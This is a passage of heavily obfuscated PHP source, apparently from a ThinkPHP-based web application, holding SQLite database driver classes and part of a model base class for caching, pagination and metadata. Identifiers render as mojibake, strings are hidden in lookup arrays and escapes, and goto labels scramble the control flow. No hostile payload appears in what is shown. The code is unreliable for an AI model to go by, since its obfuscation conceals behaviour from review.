sqlite_exec($this->_linkID, $cŠöÇÍï); $this->debug(); goto Cã¨ãá¢Ç¢; Cã¨ãá¢Ç¢: if (!1 === $dÅ›É·”­) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto dÌ’‡¬½Œ¢; dÌ’‡¬½Œ¢: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¹Ò‹Ò¹][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $aôÖ¢š¤– = sqlite_query($this->_linkID, $_SERVER[¹Ò‹Ò¹][23]); if (!$aôÖ¢š¤–) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $bñßš·’ = sqlite_query($this->_linkID, $_SERVER[¹Ò‹Ò¹][24]); if (!$bñßš·’) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $AÈ…×Ì¶Š× = array(); if ($this->numRows > 0) { for ($FåÇ·í¯ƒµ = 0; $FåÇ·í¯ƒµ < $this->numRows; $FåÇ·í¯ƒµ++) { $AÈ…×Ì¶Š×[$FåÇ·í¯ƒµ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $AÈ…×Ì¶Š×; } public function getFields($f˜µí³ôâñ) { $bÈóº×Ç›¸ =& $_SERVER[¹Ò‹Ò¹]; $CªÄŠÏ‡Ô = $this->query($bÈóº×Ç›¸[25] . $f˜µí³ôâñ . $bÈóº×Ç›¸[26]); $AÅğ…¤òÏù = array(); if ($CªÄŠÏ‡Ô) { foreach ($CªÄŠÏ‡Ô as $fé•‡‚±ÇÒ => $CÃàÅ£ïªˆ) { $AÅğ…¤òÏù[$CÃàÅ£ïªˆ[$bÈóº×Ç›¸[27]]] = array($bÈóº×Ç›¸[28] => $CÃàÅ£ïªˆ[$bÈóº×Ç›¸[27]], $bÈóº×Ç›¸[29] => $CÃàÅ£ïªˆ[$bÈóº×Ç›¸[30]], $bÈóº×Ç›¸[31] => (bool) ($CÃàÅ£ïªˆ[$bÈóº×Ç›¸[32]] === $bÈóº×Ç›¸[33]), $bÈóº×Ç›¸[34] => $CÃàÅ£ïªˆ[$bÈóº×Ç›¸[35]], $bÈóº×Ç›¸[36] => strtolower($CÃàÅ£ïªˆ[$bÈóº×Ç›¸[37]]) == $bÈóº×Ç›¸[38], $bÈóº×Ç›¸[39] => strtolower($CÃàÅ£ïªˆ[$bÈóº×Ç›¸[40]]) == $bÈóº×Ç›¸[41]); } } return $AÅğ…¤òÏù; } public function getTables($fŠîí°ÓŸ = '') { $dæ½÷¶ä§Â =& $_SERVER[¹Ò‹Ò¹]; $BÑ°ç‹ò… = $this->query($dæ½÷¶ä§Â[42] . $dæ½÷¶ä§Â[43] . $dæ½÷¶ä§Â[44]); $Aç¹À§°±‘ = array(); foreach ($BÑ°ç‹ò… as $b­•ÆÑ½Ğ¹ => $aŒÚ‰„‰Ó) { $Aç¹À§°±‘[$b­•ÆÑ½Ğ¹] = current($aŒÚ‰„‰Ó); } return $Aç¹À§°±‘; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $dàÆ„²´‘¹ =& $_SERVER[¹Ò‹Ò¹]; $fàŠ¦Ôé¦ = sqlite_last_error($this->_linkID); $this->error = $fàŠ¦Ôé¦ . $dàÆ„²´‘¹[4] . sqlite_error_string($fàŠ¦Ôé¦); if ($dàÆ„²´‘¹[33] != $this->queryStr) { $this->error .= LNG($dàÆ„²´‘¹[45]) . $this->queryStr; } think_trace($this->error, $dàÆ„²´‘¹[33], $dàÆ„²´‘¹[46]); return $this->error; } public function escapeString($F„èŸ—ï¼×) { return sqlite_escape_string($F„èŸ—ï¼×); } public function parseLimit($Eß–Òæí¿Ó) { $BÅ‚Íƒ¡¯ =& $_SERVER[¹Ò‹Ò¹]; $AèàëÔº©§ = $BÅ‚Íƒ¡¯[33]; if (!empty($Eß–Òæí¿Ó)) { $Eß–Òæí¿Ó = explode($BÅ‚Íƒ¡¯[47], $Eß–Òæí¿Ó); if (count($Eß–Òæí¿Ó) > 1) { $AèàëÔº©§ .= $BÅ‚Íƒ¡¯[48] . $Eß–Òæí¿Ó[1] . $BÅ‚Íƒ¡¯[49] . $Eß–Òæí¿Ó[0] . $BÅ‚Íƒ¡¯[50]; } else { $AèàëÔº©§ .= $BÅ‚Íƒ¡¯[48] . $Eß–Òæí¿Ó[0] . $BÅ‚Íƒ¡¯[50]; } } return $AèàëÔº©§; } } class DbSqlite3Base extends Db { public function __construct($E…Áà·òõÊ = '') { $dÉ±º…ïš =& $_SERVER[¹Ò‹Ò¹]; if (!class_exists($dÉ±º…ïš[51])) { think_exception(think_lang($dÉ±º…ïš[10]) . $dÉ±º…ïš[52]); } if (!empty($E…Áà·òõÊ)) { if (!isset($E…Áà·òõÊ[$dÉ±º…ïš[12]])) { $E…Áà·òõÊ[$dÉ±º…ïš[12]] = 438; } $this->config = $E…Áà·òõÊ; if (empty($this->config[$dÉ±º…ïš[13]])) { $this->config[$dÉ±º…ïš[13]] = array(); } } } public function connect($eÂŠ£™ßŒ = '', $f¼Éëğ¹î = 0) { $eêØ™Ì¹½ =& $_SERVER[¹Ò‹Ò¹]; if (!isset($this->linkID[$f¼Éëğ¹î])) { if (empty($eÂŠ£™ßŒ)) { $eÂŠ£™ßŒ = $this->config; } $this->linkID[$f¼Éëğ¹î] = new SQLite3($eÂŠ£™ßŒ[$eêØ™Ì¹½[17]]); if (!$this->linkID[$f¼Éëğ¹î]) { think_exception($this->linkID[$f¼Éëğ¹î]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$f¼Éëğ¹î]->busyTimeout(30000); if (1 != think_config($eêØ™Ì¹½[18])) { unset($this->config); } } return $this->linkID[$f¼Éëğ¹î]; } public function free() { $this->queryID = null; } public function query($bëœ•‡§«) { goto EÇ½ó ĞÖ; f¢æ²õ´áğ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $Bä˜÷ãßª  = $this->getAll(); $this->numRows = count($Bä˜÷ãßª ); return $Bä˜÷ãßª ; } goto dÅÈÊÀ‚…³; EÇ½ó ĞÖ: $DØ¢ù¥ÏŠ» =& $_SERVER[¹Ò‹Ò¹]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto DëêÙÚÖ’; DëêÙÚÖ’: $this->queryStr = $bëœ•‡§«; if ($this->queryID) { $this->free(); } think_action_status($DØ¢ù¥ÏŠ»[19], 1); goto CŒˆíÕğ¤ó; CŒˆíÕğ¤ó: think_status($DØ¢ù¥ÏŠ»[20]); $this->queryID = $this->_linkID->query($bëœ•‡§«); $this->debug(); goto f¢æ²õ´áğ; dÅÈÊÀ‚…³: } public function execute($F‰ÒÍ¨µø) { goto F³õ­ñæÌª; bÎÅ²£½º : if (!1 === $aÏÚ’é¨) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto AÖ“àô—»À; Fœè”ß‡è : think_status($eÇË‘›Ù[20]); $aÏÚ’é¨ = $this->_linkID->exec($F‰ÒÍ¨µø); $this->debug(); goto bÎÅ²£½º ; F³õ­ñæÌª: $eÇË‘›Ù =& $_SERVER[¹Ò‹Ò¹]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto fØ´Ö‚­Í´; fØ´Ö‚­Í´: $this->queryStr = $F‰ÒÍ¨µø; if ($this->queryID) { $this->free(); } think_action_status($eÇË‘›Ù[21], 1); goto Fœè”ß‡è ; AÖ“àô—»À: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¹Ò‹Ò¹][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $eÖ‹ŸŠİ„ê = $this->_linkID->query($_SERVER[¹Ò‹Ò¹][23]); if (!$eÖ‹ŸŠİ„ê) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $eÆˆôàª = $this->_linkID->query($_SERVER[¹Ò‹Ò¹][24]); if (!$eÆˆôàª) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $AÒ‹¢Îë— = array(); while ($D¦Œğ‹ï¦› = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $AÒ‹¢Îë—[] = $D¦Œğ‹ï¦›; } $this->queryID->reset(); return $AÒ‹¢Îë—; } public function getFields($a–í¸îÉ) { $b¿ºÃäã¢ =& $_SERVER[¹Ò‹Ò¹]; $B¨éÏó—î‚ = $this->query($b¿ºÃäã¢[25] . $a–í¸îÉ . $b¿ºÃäã¢[26]); $e½˜ŠİôÚ = array(); if ($B¨éÏó—î‚) { foreach ($B¨éÏó—î‚ as $bˆ˜‘ÁÊÍ› => $bò’š³“¦) { $e½˜ŠİôÚ[$bò’š³“¦[$b¿ºÃäã¢[28]]] = array($b¿ºÃäã¢[28] => $bò’š³“¦[$b¿ºÃäã¢[28]], $b¿ºÃäã¢[29] => $bò’š³“¦[$b¿ºÃäã¢[29]], $b¿ºÃäã¢[31] => (bool) ($bò’š³“¦[$b¿ºÃäã¢[31]] === $b¿ºÃäã¢[33]), $b¿ºÃäã¢[34] => $bò’š³“¦[$b¿ºÃäã¢[53]], $b¿ºÃäã¢[36] => (bool) $bò’š³“¦[$b¿ºÃäã¢[54]], $b¿ºÃäã¢[39] => (bool) $bò’š³“¦[$b¿ºÃäã¢[54]]); } } return $e½˜ŠİôÚ; } public function getTables($Aˆ’¬»ˆÕĞ = '') { $f÷®¡ĞŒ‰Ñ =& $_SERVER[¹Ò‹Ò¹]; $BÃ¨½ÆÒ½‰ = $this->query($f÷®¡ĞŒ‰Ñ[42] . $f÷®¡ĞŒ‰Ñ[43] . $f÷®¡ĞŒ‰Ñ[44]); $Aˆµ¾…øâ = array(); foreach ($BÃ¨½ÆÒ½‰ as $fßªã…–•® => $B¡°®˜Æ­) { $Aˆµ¾…øâ[$fßªã…–•®] = current($B¡°®˜Æ­); } return $Aˆµ¾…øâ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Fåƒ„‹‚µ¹ =& $_SERVER[¹Ò‹Ò¹]; $this->error = $this->_linkID->lastErrorMsg(); if ($Fåƒ„‹‚µ¹[33] != $this->queryStr) { $this->error .= LNG($Fåƒ„‹‚µ¹[45]) . $this->queryStr; } think_trace($this->error, $Fåƒ„‹‚µ¹[33], $Fåƒ„‹‚µ¹[46]); return $this->error; } public function escapeString($fôö÷Øï”£) { $d…Ø°««Ùğ =& $_SERVER[¹Ò‹Ò¹]; if ($this->_linkID) { return $this->_linkID->escapeString($fôö÷Øï”£); } return str_ireplace($d…Ø°««Ùğ[55], $d…Ø°««Ùğ[56], $fôö÷Øï”£); } public function parseLimit($D±–ùÚÇ—Ü) { $CëåÔô¸ŸÆ =& $_SERVER[¹Ò‹Ò¹]; $eÅ°–ËÄ· = $CëåÔô¸ŸÆ[33]; if (!empty($D±–ùÚÇ—Ü)) { $D±–ùÚÇ—Ü = explode($CëåÔô¸ŸÆ[47], $D±–ùÚÇ—Ü); if (count($D±–ùÚÇ—Ü) > 1) { $eÅ°–ËÄ· .= $CëåÔô¸ŸÆ[48] . $D±–ùÚÇ—Ü[1] . $CëåÔô¸ŸÆ[49] . $D±–ùÚÇ—Ü[0] . $CëåÔô¸ŸÆ[50]; } else { $eÅ°–ËÄ· .= $CëåÔô¸ŸÆ[48] . $D±–ùÚÇ—Ü[0] . $CëåÔô¸ŸÆ[50]; } } return $eÅ°–ËÄ·; } } goto cÍß÷¡Ø; B…†¼ï¡: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\x69\146\x79\x54\151\155\145", "\164\x69\x6d\145", "\x69\x6e\163\145\x72\164\x2c\165\x70\144\141\164\x65", "\146\x75\156\143\164\x69\x6f\156"), array("\143\162\x65\x61\164\x65\x54\151\155\145", "\x74\151\x6d\145", "\x69\156\163\145\x72\x74", "\x66\165\x6e\x63\164\x69\157\156")); public function setDataAuto($CÆÃ×ÖÊÀŠ) { $this->dataAuto = $CÆÃ×ÖÊÀŠ; } public function __construct($cˆœ¾Ô”Û‘ = '', $B‰ÒËçŠÀ = '', $døĞáìÔ = '') { parent::__construct($cˆœ¾Ô”Û‘, $B‰ÒËçŠÀ, $døĞáìÔ); } public static function textEncode($ešàÈ…ôà) { if (!$ešàÈ…ôà) { return $ešàÈ…ôà; } $dù¹ùë’£ = json_encode($ešàÈ…ôà); $dù¹ùë’£ = preg_replace_callback($_SERVER[¹Ò‹Ò¹][351], function ($fÀ¼ğ…—ë‹) { return addslashes($fÀ¼ğ…—ë‹[0]); }, $dù¹ùë’£); return json_decode($dù¹ùë’£); } public static function textDecode($d¶ÊÆÀ¡‹) { $BˆáÂ´Ô¼Ä =& $_SERVER[¹Ò‹Ò¹]; $f‹±ƒ»©¡İ = json_encode($d¶ÊÆÀ¡‹); $f‹±ƒ»©¡İ = preg_replace_callback($BˆáÂ´Ô¼Ä[352], function ($F£ÍíÂÕÁë) { return $_SERVER[¹Ò‹Ò¹][96]; }, $f‹±ƒ»©¡İ); return json_decode($f‹±ƒ»©¡İ); } protected $tableMeta = array(); protected function _beforeInsert(&$a…áîÛ°‰, $dèò­ç’Ş) { $CÚó¹‰ˆÃ =& $_SERVER[¹Ò‹Ò¹]; if (!$this->checkDataAutoHas($CÚó¹‰ˆÃ[353])) { return; } $this->dataBeforeFilter($a…áîÛ°‰, $CÚó¹‰ˆÃ[353]); } protected function _beforeUpdate(&$FİÄµ¤»ë, $Bòœ¢›ˆÚ‹) { $Däê =& $_SERVER[¹Ò‹Ò¹]; if (!$this->checkDataAutoHas($Däê[354])) { return; } $this->dataBeforeFilter($FİÄµ¤»ë, $Däê[354]); } protected function _afterSelect(&$cÏòƒ–†®ã, $CéÙ§•Î½Ô) { if (!is_array($cÏòƒ–†®ã)) { return; } if (!$this->checkDataAutoHas($_SERVER[¹Ò‹Ò¹][355])) { return; } foreach ($cÏòƒ–†®ã as &$D÷Ëå¯Œ´„) { $this->dataAfterFilter($D÷Ëå¯Œ´„); } unset($D÷Ëå¯Œ´„); } protected function _afterFind(&$bé±òùˆ², $Dº‚›È¶ˆ) { if (!is_array($bé±òùˆ²)) { return; } if (!$this->checkDataAutoHas($_SERVER[¹Ò‹Ò¹][355])) { return; } $this->dataAfterFilter($bé±òùˆ²); } public function setAutoIncrement($b—Ó‹÷äùË) { $b¢Ô—ßğ‚Â = array($this->getPk() => $b—Ó‹÷äùË); $FèŠÛ”åá‚ = $this->data($b¢Ô—ßğ‚Â)->add(); if ($FèŠÛ”åá‚) { $this->delete($FèŠÛ”åá‚); } } public function getAutoIncrement() { $aÙ‘é´®ŒŠ = $this->getTableName(); $D´ôØÌñå‘ = $this->max($this->getPk()); $cÅËŞíà¹ = $this->query("\163\x68\x6f\x77\40\164\141\x62\154\x65\40\x73\x74\141\x74\165\x73\40\167\150\145\x72\145\40\x4e\141\155\x65\x3d\x27{$aÙ‘é´®ŒŠ}\x27"); $c¤•¾ø©¡¨ = $cÅËŞíà¹[0][$_SERVER[¹Ò‹Ò¹][356]]; $FÃ¿Š”æÍ‘ = max($D´ôØÌñå‘, $c¤•¾ø©¡¨); return $FÃ¿Š”æÍ‘; } protected function _callBefore($cõºöÅõ, $CÒØàê›šÍ) { return $this->cacheCallCheck($cõºöÅõ, $CÒØàê›šÍ, !1); } protected function _callAfter($FŠĞÚÄÛßŞ, $bà–Ã°˜âç) { return $this->cacheCallCheck($FŠĞÚÄÛßŞ, $bà–Ã°˜âç, !0); } protected function cacheFunctionAlias($A»¯µÀÊ»¹) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($cŸˆÒÇÅòß, $cİó¿ë’‚, $A°ŞÄ¯áœ = false) { $fç¯ƒí–ÒÔ = $this->cacheFunctionAlias($cİó¿ë’‚); if (!$fç¯ƒí–ÒÔ) { return; } foreach ($fç¯ƒí–ÒÔ as $FŸùÍÏÅ‡¤ => $d¤•†®Šò) { $DäĞ©¡Î = $d¤•†®Šò[0]; $f¦“’ñ¯Û = explode($_SERVER[¹Ò‹Ò¹][47], $d¤•†®Šò[1]); if ($cŸˆÒÇÅòß == $FŸùÍÏÅ‡¤) { return $this->cacheFunctionGet($FŸùÍÏÅ‡¤, $DäĞ©¡Î); } if ($A°ŞÄ¯áœ && in_array($cŸˆÒÇÅòß, $f¦“’ñ¯Û)) { $this->cacheFunctionClear($FŸùÍÏÅ‡¤, $DäĞ©¡Î); } } } public function cacheFunctionGet($Aƒ„óÀˆâã, $C¾¢èÛšÊ) { $BõĞÕÁ‹Š• = $this->cacheKeyMake($Aƒ„óÀˆâã, $C¾¢èÛšÊ); $aĞÉµˆ›¢ = Cache::get($BõĞÕÁ‹Š•); if (!is_array($aĞÉµˆ›¢)) { $aĞÉµˆ›¢ = call_user_func_array(array($this, $Aƒ„óÀˆâã), array($C¾¢èÛšÊ, !0)); Cache::set($BõĞÕÁ‹Š•, $aĞÉµˆ›¢); } return $aĞÉµˆ›¢; } public function cacheFunctionClear($e‘Öô¢æİ¨, $bø’¯ï«¦‰) { $bÚá‡¸µ¹· = $bø’¯ï«¦‰; if (!is_array($bø’¯ï«¦‰)) { $bÚá‡¸µ¹· = array($bø’¯ï«¦‰); } foreach ($bÚá‡¸µ¹· as $CÙÈ¸ô§ç) { $aÂ˜è›¢Ú = $this->cacheKeyMake($e‘Öô¢æİ¨, $CÙÈ¸ô§ç); Cache::remove($aÂ˜è›¢Ú); } } private function cacheKeyMake($AëÜí¹íÀ‡, $d‰Ë…õ„ÀØ) { $dÒ£†è¦’ =& $_SERVER[¹Ò‹Ò¹]; return get_class($this) . $dÒ£†è¦’[70] . $AëÜí¹íÀ‡ . $dÒ£†è¦’[357] . $d‰Ë…õ„ÀØ; } protected function selectPageReset() { $Dô§ˆõŞ‹ë =& $_SERVER[¹Ò‹Ò¹]; if (isset($GLOBALS[$Dô§ˆõŞ‹ë[358]])) { return; } $GLOBALS[$Dô§ˆõŞ‹ë[358]] = isset($GLOBALS[$Dô§ˆõŞ‹ë[7]][$Dô§ˆõŞ‹ë[359]]) ? $GLOBALS[$Dô§ˆõŞ‹ë[7]][$Dô§ˆõŞ‹ë[359]] : !1; $GLOBALS[$Dô§ˆõŞ‹ë[360]] = isset($GLOBALS[$Dô§ˆõŞ‹ë[7]][$Dô§ˆõŞ‹ë[349]]) ? $GLOBALS[$Dô§ˆõŞ‹ë[7]][$Dô§ˆõŞ‹ë[349]] : !1; $GLOBALS[$Dô§ˆõŞ‹ë[7]][$Dô§ˆõŞ‹ë[359]] = !1; $GLOBALS[$Dô§ˆõŞ‹ë[7]][$Dô§ˆõŞ‹ë[349]] = !1; } protected function selectPageRestore() { $aĞÓ¸œš­ =& $_SERVER[¹Ò‹Ò¹]; if (!isset($GLOBALS[$aĞÓ¸œš­[358]])) { return; } $GLOBALS[$aĞÓ¸œš­[7]][$aĞÓ¸œš­[359]] = $GLOBALS[$aĞÓ¸œš­[358]]; $GLOBALS[$aĞÓ¸œš­[7]][$aĞÓ¸œš­[349]] = $GLOBALS[$aĞÓ¸œš­[360]]; unset($GLOBALS[$aĞÓ¸œš­[358]]); unset($GLOBALS[$aĞÓ¸œš­[360]]); } protected function selectPage($aÆÀõïì¿Ş = 200, $CÖùˆ³ç´Ò = 1) { goto Fæ”ÒÊ§¹; Dğ«¾öğ©’: return $D´¹‹ÄÊÙ¸; goto fÑÌÆ½Ì‡Ç; Fˆß¬ŠŞÑ: $DÓë«÷õó = 50000; $aÆÀõïì¿Ş = isset($in[$CêƒÃëÎ[359]]) && $in[$CêƒÃëÎ[359]] ? $in[$CêƒÃëÎ[359]] : $aÆÀõïì¿Ş; if ($aÆÀõïì¿Ş === -1) { $in[$CêƒÃëÎ[359]] = !1; $DÓë«÷õó = 100000000; $aÆÀõïì¿Ş = $DÓë«÷õó; } goto E™¿©ù‹Ê’; E™¿©ù‹Ê’: $f¦•˜çù˜Â = $F¨‰õ·‚¢; $f¦•˜çù˜Â[$CêƒÃëÎ[361]] = array(); $aÆÀõïì¿Ş = intval($aÆÀõïì¿Ş); goto fÃñŸÃÀÆä; F¿ŠÇÓé: $bâ®–Ğë‰ = array(); $f·¸…ÙÑ°ˆ = 1; if ($CÖùˆ³ç´Ò == 1 && $f·¸…ÙÑ°ˆ) { $this->optionsValue($F¨‰õ·‚¢); $bâ®–Ğë‰ = $this->page($CÖùˆ³ç´Ò, $aÆÀõïì¿Ş)->select(); $cªŞ‡ŒÖ ¿ = is_array($bâ®–Ğë‰) ? count($bâ®–Ğë‰) : 0; if ($cªŞ‡ŒÖ ¿ < $aÆÀõïì¿Ş) { $e¯â¡“ÚŞÍ = 1; } else { $this->optionsValue($f¦•˜çù˜Â); $cªŞ‡ŒÖ ¿ = intval($this->count()); $e¯â¡“ÚŞÍ = ceil($cªŞ‡ŒÖ ¿ / $aÆÀõïì¿Ş); } } else { $this->optionsValue($f¦•˜çù˜Â); $cªŞ‡ŒÖ ¿ = intval($this->count()); $e¯â¡“ÚŞÍ = ceil($cªŞ‡ŒÖ ¿ / $aÆÀõïì¿Ş); $CÖùˆ³ç´Ò = $CÖùˆ³ç´Ò >= $e¯â¡“ÚŞÍ ? $e¯â¡“ÚŞÍ : $CÖùˆ³ç´Ò; $this->optionsValue($F¨‰õ·‚¢); $bâ®–Ğë‰ = $this->page($CÖùˆ³ç´Ò, $aÆÀõïì¿Ş)->select(); } goto FĞŞİ¬Åã…; Fæ”ÒÊ§¹: $CêƒÃëÎ =& $_SERVER[¹Ò‹Ò¹]; global $in; $F¨‰õ·‚¢ = $this->optionsValue(); goto Fˆß¬ŠŞÑ; FĞŞİ¬Åã…: if (!is_array($bâ®–Ğë‰)) { $bâ®–Ğë‰ = array(); } if ($e¯â¡“ÚŞÍ == 1) { $cªŞ‡ŒÖ ¿ = count($bâ®–Ğë‰); } $D´¹‹ÄÊÙ¸ = array($CêƒÃëÎ[362] => array($CêƒÃëÎ[363] => $cªŞ‡ŒÖ ¿, $CêƒÃëÎ[359] => $aÆÀõïì¿Ş, $CêƒÃëÎ[349] => $CÖùˆ³ç´Ò, $CêƒÃëÎ[364] => $e¯â¡“ÚŞÍ), $CêƒÃëÎ[365] => $bâ®–Ğë‰); goto Dğ«¾öğ©’; fÃñŸÃÀÆä: $aÆÀõïì¿Ş = $aÆÀõïì¿Ş <= 5 ? 5 : ($aÆÀõïì¿Ş >= $DÓë«÷õó ? $DÓë«÷õó : $aÆÀõïì¿Ş); $CÖùˆ³ç´Ò = intval(isset($in[$CêƒÃëÎ[349]]) && $in[$CêƒÃëÎ[349]] ? $in[$CêƒÃëÎ[349]] : $CÖùˆ³ç´Ò); $CÖùˆ³ç´Ò = $CÖùˆ³ç´Ò <= 1 ? 1 : $CÖùˆ³ç´Ò; goto F¿ŠÇÓé; fÑÌÆ½Ì‡Ç: } protected function checkLength($cš”ù§Î, $CçáÕ‰ãÚ = 0, $F¹¥º” = '') { $dÎ¯†ñ„ÇÆ =& $_SERVER[¹Ò‹Ò¹]; $CçáÕ‰ãÚ = $CçáÕ‰ãÚ ? $CçáÕ‰ãÚ : 65536; if (!$cš”ù§Î || strlen($cš”ù§Î) < $CçáÕ‰ãÚ) { return; } $F¹¥º” = $F¹¥º” ? $F¹¥º” . $dÎ¯†ñ„ÇÆ[67] : $dÎ¯†ñ„ÇÆ[33]; show_json($F¹¥º” . LNG($dÎ¯†ñ„ÇÆ[366]) . "\x28{$CçáÕ‰ãÚ}\x29", !1); } protected function metaSet($cÕæÙ²¶’¸, $FˆÀã§¼Ú‚ = null, $CŸ÷¸ÌÑ— = null) { goto A¥ô£½ÀÉˆ; fÜ¦ã÷ñØ²: CacheLock::unlock($D…›àñ¸¥â); return !0; goto AõáŠºä±¨; c¾âçˆËŒ¼: if (is_null($FˆÀã§¼Ú‚)) { return $b‘Ê‘í»…Ì->where(array($AĞÒÀÁƒÒÓ => $cÕæÙ²¶’¸))->delete(); } if (is_null($CŸ÷¸ÌÑ—) && is_string($FˆÀã§¼Ú‚)) { return $b‘Ê‘í»…Ì->where($D³™ËºØÈñ)->delete(); } $EÈõ¦×…ç = is_array($FˆÀã§¼Ú‚) ? $FˆÀã§¼Ú‚ : array(); goto F©ŸÒğ™«; ağ÷¾•çˆ: $fˆ‹£â” = $this->tableMeta[$dê®¡†É[368]]; $b‘Ê‘í»…Ì = Model($fˆ‹£â”); $D³™ËºØÈñ = array($AĞÒÀÁƒÒÓ => $cÕæÙ²¶’¸, $dê®¡†É[369] => $FˆÀã§¼Ú‚); goto c¾âçˆËŒ¼; C´Æ˜ğÉšì: $D…›àñ¸¥â = $dê®¡†É[371] . $this->tableMeta; CacheLock::lock($D…›àñ¸¥â); $b‘Ê‘í»…Ì->where(array($AĞÒÀÁƒÒÓ => $cÕæÙ²¶’¸))->addAll($c´î÷è½¤, array(), !0); goto fÜ¦ã÷ñØ²; F©ŸÒğ™«: if (is_string($FˆÀã§¼Ú‚)) { $EÈõ¦×…ç[$FˆÀã§¼Ú‚] = $CŸ÷¸ÌÑ—; } $c´î÷è½¤ = array(); foreach ($EÈõ¦×…ç as $Cµ¹„†ÒÂŠ => $dÄÜ­‰¯çâ) { $this->checkLength($dÄÜ­‰¯çâ, !1, $fˆ‹£â” . $dê®¡†É[4] . $Cµ¹„†ÒÂŠ); $c´î÷è½¤[] = array($AĞÒÀÁƒÒÓ => $cÕæÙ²¶’¸, $dê®¡†É[92] => $Cµ¹„†ÒÂŠ, $dê®¡†É[370] => $dÄÜ­‰¯çâ); } goto C´Æ˜ğÉšì; A¥ô£½ÀÉˆ: $dê®¡†É =& $_SERVER[¹Ò‹Ò¹]; if (!$this->tableMeta || !$cÕæÙ²¶’¸) { return !1; } $AĞÒÀÁƒÒÓ = $this->tableMeta[$dê®¡†É[367]]; goto ağ÷¾•çˆ; AõáŠºä±¨: } public function metaGet($cŒÏàãôöµ, $CÌ‡äçê“¦ = false) { goto fĞìî°±”ä; dĞÈÚªŞ„: $cÊ‘ß¾‘‘á = Model($this->tableMeta[$B®„“œšÌ»[368]]); if ($CÌ‡äçê“¦) { $EäØÚì“ö¥ = array($D×ã’«ØĞ => $cŒÏàãôöµ, $B®„“œšÌ»[92] => $CÌ‡äçê“¦); return $cÊ‘ß¾‘‘á->where($EäØÚì“ö¥)->getField($B®„“œšÌ»[370]); } $EäØÚì“ö¥ = array($D×ã’«ØĞ => $cŒÏàãôöµ); goto AÂ¹»î˜¤‡; fĞìî°±”ä: $B®„“œšÌ» =& $_SERVER[¹Ò‹Ò¹]; if (!$this->tableMeta) { return array(); } $D×ã’«ØĞ = $this->tableMeta[$B®„“œšÌ»[367]]; goto dĞÈÚªŞ„; AÂ¹»î˜¤‡: $a¡…ëÎ¨‰ = $cÊ‘ß¾‘‘á->field($B®„“œšÌ»[372])->where($EäØÚì“ö¥)->select(); $a¡…ëÎ¨‰ = array_to_keyvalue($a¡…ëÎ¨‰, $B®„“œšÌ»[92], $B®„“œšÌ»[370]); return $a¡…ëÎ¨‰; goto f¡ë¼ß„áß; f¡ë¼ß„áß: } private function checkDataAutoHas($EÕÜÍœİ¨) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $bª°‚æ…ìò) { if (in_array($EÕÜÍœİ¨, explode($_SERVER[¹Ò‹Ò¹][47], $bª°‚æ…ìò[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$dò¼ŠÄØÔë, $d‡ÆÌ¤³¤œ) { $C‰…Ã¢İ¢ =& $_SERVER[¹Ò‹Ò¹]; foreach ($this->dataAuto as $cŒ½¦£ÃÂ®) { $DëÅôŸœÁí = $cŒ½¦£ÃÂ®[0]; if (!in_array($d‡ÆÌ¤³¤œ, explode($C‰…Ã¢İ¢[47], $cŒ½¦£ÃÂ®[2]))) { continue; } switch (trim($cŒ½¦£ÃÂ®[3])) { case $C‰…Ã¢İ¢[317]: case $C‰…Ã¢İ¢[318]: $d‰ÓÈã¿‹® = $cŒ½¦£ÃÂ®[1]; $e„íì¾ŞÀ = isset($cŒ½¦£ÃÂ®[4]) ? (array) $cŒ½¦£ÃÂ®[4] : array(); if ($d‰ÓÈã¿‹® == $C‰…Ã¢İ¢[195] && array_key_exists($DëÅôŸœÁí, $dò¼ŠÄØÔë)) { if (!$dò¼ŠÄØÔë[$DëÅôŸœÁí]) { unset($dò¼ŠÄØÔë[$DëÅôŸœÁí]); } break; } if (isset($dò¼ŠÄØÔë[$DëÅôŸœÁí])) { array_unshift($e„íì¾ŞÀ, $dò¼ŠÄØÔë[$DëÅôŸœÁí]); } if ($C‰…Ã¢İ¢[317] == $cŒ½¦£ÃÂ®[3]) { $dò¼ŠÄØÔë[$DëÅôŸœÁí] = call_user_func_array($d‰ÓÈã¿‹®, $e„íì¾ŞÀ); } else { $dò¼ŠÄØÔë[$DëÅôŸœÁí] = call_user_func_array(array(&$this, $d‰ÓÈã¿‹®), $e„íì¾ŞÀ); } break; case $C‰…Ã¢İ¢[269]: $dò¼ŠÄØÔë[$DëÅôŸœÁí] = $dò¼ŠÄØÔë[$cŒ½¦£ÃÂ®[1]]; break; case $C‰…Ã¢İ¢[290]: if (isset($dò¼ŠÄØÔë[$DëÅôŸœÁí]) && !is_string($dò¼ŠÄØÔë[$DëÅôŸœÁí])) { $dò¼ŠÄØÔë[$DëÅôŸœÁí] = 